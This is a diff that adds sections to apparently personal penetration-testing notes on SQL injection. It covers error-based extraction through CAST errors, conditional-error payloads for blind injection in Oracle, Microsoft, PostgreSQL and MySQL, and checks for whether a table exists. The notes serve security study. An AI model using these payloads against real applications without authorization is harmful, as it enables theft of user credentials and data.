@@ -108,6 +108,24 @@ More information can also be found on the [PortSwigger UNION Attacks](https://po
 ' UNION SELECT NULL,username || '-' || password FROM users--
 {% endhighlight %}
 
+## Error Based Extraction
+- If an application simply just returns an error to the user, data could possibly be extracted. A simple workflow could go as follows:
+### Oracle Based:
+1. Try a simple error (this proves we can run SQL but fails because it wants a bool)
+{% highlight SQL %}
+' AND CAST((SELECT 1) AS int)--
+{% endhighlight %}
+
+2. Make it a bool condition (the error will no go away)
+{% highlight SQL %}
+' AND 1=CAST((SELECT 1) AS int)-- 
+{% endhighlight %}
+
+3. Extract information (this will fail as it tries to convert string to int, logging the string in the error)
+{% highlight SQL %}
+' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+{% endhighlight %}
+
 ## Discovering System Information
 - There is often varibles and tables that come as default for many SQL implementations that details the versions and technologies used
 - These are specific to the languag but can be very helpful for recon on the target
@@ -160,6 +178,32 @@ Depending on the nature of the vulnerability, the following techniques can be us
 - You can change the logic of the query to trigger a detectable difference in the application's response depending on the truth of a single condition. This might involve injecting a new condition into some Boolean logic, or conditionally triggering an error such as a divide-by-zero.
 - You can conditionally trigger a time delay in the processing of the query, allowing you to infer the truth of the condition based on the response time.
 - You can trigger an out-of-band network interaction, using [OAST](https://alipali737.github.io/pen-test-docs/Knowledge/Testing/Application%20Security%20Testing%20Methods.html#out-of-band-application-security-testing-oast) techniques. Often you can directly exfiltrate data via the out-of-band channel eg. placing the data into a DNS lookup for a domain you control.
+
+It is important to ensure that the injection is being treated as SQL and not something else, an easy way to do this is my trying to execute a simple SQL syntax (like string concatenation) and something the produced the opposite:
+{% highlight sql %}
+Oracle: 
+a' || (SELECT '' FROM dual) || '
+a' || (SELECT '' FROM table-doesnt-exist) || '
+{% endhighlight %}
+
+You can test a single boolean condition and trigger a database error if the condition is true.
+
+|   |   |
+|---|---|
+|Oracle|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`|
+|Microsoft|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`|
+|PostgreSQL|`1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`|
+|MySQL|`SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`|
+
+This can then be expanded such as:
+{% highlight sql %}
+SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator'
+{% endhighlight %}
+
+You can determine if a table exists by searching for the first row in a table:
+{% highlight sql %}
+SELECT '' FROM users WHERE ROWNUM = 1
+{% endhighlight %}
 
 A nice way to determine the length of a field could be by iterating over a condition of its length:
 {% highlight sql %}
